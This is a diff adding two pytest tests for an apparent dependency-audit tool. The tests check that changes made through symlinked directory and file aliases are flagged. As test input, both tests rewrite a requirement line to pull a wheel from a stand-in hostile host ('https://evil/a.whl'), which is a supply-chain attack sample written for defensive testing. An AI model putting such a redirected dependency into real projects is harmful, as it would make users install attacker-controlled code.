@@ -1080,3 +1080,31 @@ def test_removing_js_source_override_is_a_source_change(git_repo, section):
     p.write_text(json.dumps(after))
     head = commit_all(git_repo, "remove source override")
     assert audit_dependency_changes(git_repo, base, head)
+
+
+@pytest.mark.parametrize("new_link", [False, True])
+def test_composed_directory_and_file_alias_flags(git_repo: Path, new_link):
+    (git_repo / "vendor").mkdir()
+    (git_repo / "deps.list").write_text("a==1\n")
+    (git_repo / "vendor/prod.txt").symlink_to("../deps.list")
+    if not new_link:
+        (git_repo / "requirements").symlink_to("vendor")
+    base = commit_all(git_repo, "composed aliases")
+    if new_link:
+        (git_repo / "requirements").symlink_to("vendor")
+    else:
+        (git_repo / "deps.list").write_text("a @ https://evil/a.whl\n")
+    head = commit_all(git_repo, "change composed dependency")
+    found = audit_dependency_changes(git_repo, base, head)
+    assert any(f.rule == "dep-source" and "requirements/prod.txt" in f.evidence for f in found)
+
+
+def test_recursive_directory_alias_expansion_is_bounded(git_repo: Path):
+    (git_repo / "vendor").mkdir()
+    (git_repo / "vendor/prod.txt").write_text("a==1\n")
+    (git_repo / "vendor/repeat").symlink_to(".")
+    (git_repo / "requirements").symlink_to("vendor")
+    commit_all(git_repo, "recursive directory alias")
+    found = change(git_repo, {"vendor/prod.txt": "a @ https://evil/a.whl\n"})
+    assert found and all(f.severity == "high" for f in found)
+    assert any("requirements/prod.txt" in f.evidence for f in found)
